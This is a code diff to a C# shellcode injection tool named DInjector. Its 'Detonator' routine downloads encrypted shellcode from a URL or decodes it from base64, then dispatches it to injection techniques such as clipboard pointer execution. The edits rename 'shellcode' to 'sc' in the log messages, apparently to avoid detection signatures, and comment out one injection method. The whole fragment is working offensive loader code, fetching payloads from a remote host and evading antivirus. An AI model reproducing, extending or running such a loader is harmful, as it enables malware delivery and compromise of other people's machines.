@@ -122,7 +122,7 @@ namespace DInjector
             byte[] shellcodeEncrypted;
             if (shellcodePath.StartsWith("http", ignoreCase: true, culture: new CultureInfo("en-US")))
             {
-                Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
+                Console.WriteLine("(Detonator) [*] Loading sc from URL");
                 WebClient wc = new WebClient();
                 ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                 MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
@@ -131,7 +131,7 @@ namespace DInjector
             }
             else
             {
-                Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
+                Console.WriteLine("(Detonator) [*] Loading sc from base64 input");
                 shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
             }
 
@@ -193,11 +193,11 @@ namespace DInjector
                             debug);
                         break;
 
-                    case "functionpointerunsafe":
+                    /*case "functionpointerunsafe":
                         FunctionPointerUnsafe.Execute(
                             shellcodeBytes,
                             debug);
-                        break;
+                        break;*/
 
                     case "clipboardpointer":
                         ClipboardPointer.Execute(
